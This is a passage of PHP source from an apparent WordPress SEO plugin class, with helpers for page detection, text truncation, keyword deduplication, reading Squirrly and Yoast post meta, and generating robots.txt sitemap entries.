            if (isset($this->author->$what)) {
                return $this->author->$what;
            }
        }

        return false;
    }

    public function getPaged($link)
    {
        $page = get_query_var('paged');
        if ($page && $page > 1) {
            $link = trailingslashit($link) . "page/" . "$page/";
        }
        return $link;
    }

    /**
     * Check if is the homepage
     *
     * @return bool
     */
    private function isHomePage()
    {
        global $wp_query;

        return (is_home() || (isset($wp_query->query) && empty($wp_query->query) && !is_preview()));
    }

    private function isHtmlHeader()
    {
        $headers = headers_list();

        foreach ($headers as $index => $value) {
            if (strpos($value, ':') !== false) {
                $exploded = @explode(': ', $value);
                if (count($exploded) > 1) {
                    $headers[$exploded[0]] = $exploded[1];
                }
            }
        }

        if (isset($headers['Content-Type'])) {
            if (strpos($headers['Content-Type'], 'text/html') !== false) {
                return true;
            }
        } else {
            return true;
        }

        return false;
    }

    /**
     * Check if page is shown in front
     *
     * @return bool
     */
    private function checkFrontPage()
    {
        return is_page() && get_option('show_on_front') == 'page' && isset($this->post->ID) && $this->post->ID == get_option('page_on_front');
    }

    /**
     * Check if page is shown in home
     *
     * @return bool
     */
    private function checkPostsPage()
    {
        return is_home() && get_option('show_on_front') == 'page' && isset($this->post->ID) && $this->post->ID == get_option('page_for_posts');
    }

    public function truncate($text, $min, $max)
    {
        if (function_exists('strip_tags')) {
            $text = strip_tags($text);
        }
        $text = str_replace(']]>', ']]&gt;', $text);
        $text = @preg_replace('|\[(.+?)\](.+?\[/\\1\])?|s', '', $text);
        $text = strip_tags($text);

        if ($max < strlen($text)) {
            while ($text[$max] != ' ' && $max > $min) {
                $max--;
            }
        }
        $text = substr($text, 0, $max);
        return trim(stripcslashes($text));
    }

    public function _truncate($text)
    {
        if (function_exists('strip_tags'))
            $text = strip_tags($text);
        $text = str_replace(']]>', ']]&gt;', $text);
        $text = @preg_replace('|\[(.+?)\](.+?\[/\\1\])?|s', '', $text);
        $text = strip_tags($text);

        return trim(stripcslashes($text));
    }

    /**
     * Show just distinct keywords
     *
     * @return string
     */
    public function getUniqueKeywords($keywords)
    {
        $all = array();
        if (is_array($keywords)) {
            foreach ($keywords as $word) {
                if (function_exists('mb_strtolower')) {
                    $all[] = mb_strtolower($word, get_bloginfo('charset'));
                } else {
                    $all[] = strtolower($word);
                }
            }
        }

        if (is_array($all) && count($all) > 0) {
            $all = array_unique($all);
            if (sizeof($all) > $this->max_keywords) {
                $all = array_slice($all, 0, $this->max_keywords);
            }

            return implode(',', $all);
        }

        return '';
    }

    /**
     * Check if other plugin are/were installed and don't change the SEO
     *
     * @param type $post_id
     * @return boolean
     */
    public function getAdvancedMeta($post_id, $meta = 'title')
    {
        global $wpdb;

        $field = '';
        $cond = '';

        if (!isset($post_id) || (int)$post_id == 0) {
            return '';
        }

        switch ($meta) {
            case 'title':
                $field = '_sq_fp_title';
                break;
            case 'description':
                $field = '_sq_fp_description';
                break;
            case 'keyword':
                $field = '_sq_fp_keywords';
                break;
            case 'ogimage':
                $field = '_sq_fp_ogimage';
                break;
            case 'canonical':
                $field = '_sq_canonical';
                break;
            default:
                $field = '_sq_fp_title';
        }

        if ($field <> '' && isset($this->meta[$post_id][$field])) {
            return $this->meta[$post_id][$field];
        }

        // Get the custom Squirrly meta
        //////////////////////////////////////////
        $fields = array('_sq_fp_title' => '', '_sq_fp_description' => '', '_sq_fp_keywords' => '', '_sq_fp_ogimage' => '', '_sq_canonical' => '');

        $sql = "SELECT `meta_key`, `meta_value`
                       FROM `" . $wpdb->postmeta . "`
                        WHERE `post_id`=" . (int)$post_id;

        if ($rows = $wpdb->get_results($sql)) {
            foreach ($rows as $row) {
                if (array_key_exists($row->meta_key, $fields)) {
                    $this->meta[$post_id][$row->meta_key] = $row->meta_value;
                }
            }
        }
        if (isset($this->meta[$post_id]) && is_array($this->meta[$post_id])) {
            $this->meta[$post_id] = array_merge($fields, $this->meta[$post_id]);
        } else {
            $this->meta[$post_id] = $fields;
        }
//////////////////////////////////////////

        if ($field <> '') {
            return $this->meta[$post_id][$field];
        }
/////////////
        return false;
    }

    /**
     * Check if other plugin are/were installed and don't change the SEO
     *
     * @param type $post_id
     * @return boolean
     */
    public function getOtherPluginsMeta($post_id, $meta = 'title')
    {
        global $wpdb;

        $field = '';
        $cond = '';

        if (!isset($post_id) || (int)$post_id == 0) {
            return '';
        }

        //check yoast
        switch ($meta) {
            case 'title':
                $field = '_yoast_wpseo_title';
                break;
            case 'description':
                $field = '_yoast_wpseo_metadesc';
                break;
            case 'keyword':
                $field = '_yoast_wpseo_focuskw';
                break;
            default:
                $field = '_yoast_wpseo_title';
        }

        if ($field <> '' && isset($this->meta[$post_id][$field])) {
            return $this->meta[$post_id][$field];
        }

// Get the custom Squirrly meta
//////////////////////////////////////////
        $fields = array('_yoast_wpseo_title' => '', '_yoast_wpseo_metadesc' => '', '_yoast_wpseo_focuskw' => '');

        $sql = "SELECT `meta_key`, `meta_value`
                       FROM `" . $wpdb->postmeta . "`
                       WHERE `post_id`=" . (int)$post_id;

        $rows = $wpdb->get_results($sql);
        if ($rows) {
            foreach ($rows as $row) {
                if (array_key_exists($row->meta_key, $fields)) {
                    $this->meta[$post_id][$row->meta_key] = $row->meta_value;
                }
            }
        }
        if (isset($this->meta[$post_id]) && is_array($this->meta[$post_id])) {
            $this->meta[$post_id] = array_merge($fields, $this->meta[$post_id]);
        } else {
            $this->meta[$post_id] = $fields;
        }
//////////////////////////////////////////
        if ($field <> '') {
            return $this->meta[$post_id][$field];
        }
        /////////////
        return false;
    }

    /**
     * ROBOTSTXT
     */
    // add sitemap location in robots.txt generated by WP
    public function robots($content = '')
    {
        global $blog_id;

        /** display robots.txt */
        header('Status: 200 OK', true, 200);
        header('Content-type: text/plain; charset=' . get_bloginfo('charset'));


        echo "\n# Squirrly SEO Robots";

        if (get_option('blog_public') != 1) {
            echo "\n# Squirrly Sitemaps is disabled. Please see Site Visibility on Settings > Reading.";
        } else {
            if (SQ_Tools::$options['sq_auto_sitemap'] == 1) {
                foreach ((array)SQ_Tools::$options['sq_sitemap'] as $name => $sitemap) {
                    if ($name == 'sitemap-product' && !SQ_ObjController::getModel('SQ_BlockSettingsSeo')->isEcommerce()) {
                        continue;
                    }
                    if ($sitemap[1] == 1 || $sitemap[1] == 2) {
                        echo "\nSitemap: " . trailingslashit(get_bloginfo('url')) . $sitemap[0];
                    }
                }
            }

            if (empty(SQ_Tools::$options['sq_sitemap']))
                echo "\n# No Squirrly SEO Robots found. ";
        }
        echo "\n\n";

        if (!empty(SQ_Tools::$options['sq_robots_permission'])) {
            foreach ((array)SQ_Tools::$options['sq_robots_permission'] as $robot_txt)
                echo $robot_txt . "\n";
        }
        echo "\n\n";

        echo $content;
        exit;
    }

}
